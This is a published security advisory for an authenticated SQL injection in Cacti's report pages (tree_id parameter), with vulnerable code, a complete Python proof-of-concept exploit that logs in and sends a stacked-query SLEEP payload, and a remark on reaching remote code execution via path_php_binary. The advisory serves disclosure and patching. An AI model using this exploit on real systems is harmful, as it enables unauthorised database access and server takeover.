# Authenticated SQL injection vulnerability when managing reports

High

[netniV](/netniV)
published
GHSA-gj95-7xr8-9p7g
Sep 5, 2023

## Package

Cacti

## Affected versions

< 1.2.25

## Patched versions

1.2.25, 1.3.0

## Description

### Summary

An authenticated SQL injection vulnerability was discovered during the review of this project. This allows authenticated users to exploit the SQL injection vulnerability to perform privilege escalation and remote code execution.

### Details

The vulnerability resides in the `reports_user.php` file. In `ajax_get_branches`, the `tree_id` parameter is passed to the `reports_get_branch_select` function without any validation.

```
switch (get_request_var('action')) {
	// ...
	case 'ajax_get_branches':
		print reports_get_branch_select(get_request_var('tree_id'));
```

An SQL injection vulnerability arises in the `reports_get_branch_select` function, as the `tree_id` variable is directly utilized in the WHERE clause of the SQL statement when the `tree_id` variable is greater than 0.

```
function reports_get_branch_select($tree_id) {
	$sql_where = '';
	if ($tree_id > 0) {
		$sql_where .= ($sql_where != '' ? ' AND ':'') . 'gt.id=' . $tree_id;
	}

	$branches = array_rekey(
		get_allowed_branches($sql_where),
		'id', 'name'
	);
```

The same code is also present in the `ajax_get_branches` case of the switch statement in the `reports_admin.php` file, which is likewise affected by SQL injection

### PoC

By running the following Python3 code, you will observe a delay of 10 seconds in the response, which indicates the occurrence of SQL injection.

```
import argparse
import requests
import sys
import urllib3

#import os
#os.environ['http_proxy'] = 'http://localhost:8080'

sleep_time = 10
payload = f"""1));SELECT SLEEP({sleep_time})-- -"""

def get_csrf_token():
    url = f"{target}/index.php"

    res_body = session.get(url).content.decode()
    csrf_token = res_body.split('var csrfMagicToken = "')[1].split('"')[0]
    if not csrf_token:
        print("[-] Unable to find csrf_token")
        sys.exit()
    return csrf_token

def login(username,password):
    login_url = f"{target}/index.php"

    csrf_token = get_csrf_token()
    data = {'action':'login','login_username':username,'login_password':password,'__csrf_magic':csrf_token}

    res_body = session.post(login_url,data=data).content.decode()

    if 'You are now logged into <' in res_body:
        print('[+] Login successful!')
    else:
        print('[-] Login failed. Check your credentials')
        sys.exit()

def exploit():
    url = f"{target}/reports_user.php"

    params = {
        'action':'ajax_get_branches',
        'tree_id':payload
    }

    print('[+] Sending payload...')
    print(f"[+] Payload: {payload}")
    session.get(url,params=params)

if __name__=='__main__':
    urllib3.disable_warnings()
    parser = argparse.ArgumentParser(description="Cacti 1.2.24 - reports_user.php 'tree_id' SQL Injection (authenticated)")
    parser.add_argument('-t','--target',help='',required=True)
    parser.add_argument('-u','--username',help='',required=True)
    parser.add_argument('-p','--password',help='',required=True)
    args = parser.parse_args()

    username = args.username
    password = args.password
    target = args.target
    session = requests.Session()

    login(username,password)
    exploit()
```

### Impact

This vulnerability presents a significant risk as authenticated users can exploit the SQL injection vulnerability to escalate privileges and execute remote code, potentially compromising the system's integrity and confidentiality.

As the application accepts stacked queries, it is possible to achieve remote code execution by altering the 'path\_php\_binary' value in the database.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
